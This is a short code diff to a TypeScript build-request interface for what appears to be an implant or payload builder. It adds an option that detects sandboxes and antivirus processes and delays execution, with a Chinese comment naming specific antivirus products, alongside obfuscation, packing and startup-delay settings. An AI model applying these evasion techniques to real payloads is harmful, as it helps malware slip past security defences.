@@ -297,6 +297,13 @@ export interface BuildRequest {
   xor_key_size?: number
   garble_enabled?: boolean
   upx_enabled?: boolean
+  /**
+   * 主动反沙箱进程检测（默认关闭）：启动时枚举进程并与安全软件/分析工具进程名
+   * 比对，命中则延迟执行。国产杀软（360/火绒/电脑管家）主动防御会拦截该对抗行为，
+   * 且会把 toolhelp32 导入与进程名字符串写进载荷，故默认不编译。
+   */
+  evasion_scan?: boolean
+  /** 启动随机延迟（秒）：留空用服务端配置（implant.startup_delay_min/max） */
   startup_delay_min?: number
   startup_delay_max?: number
 }
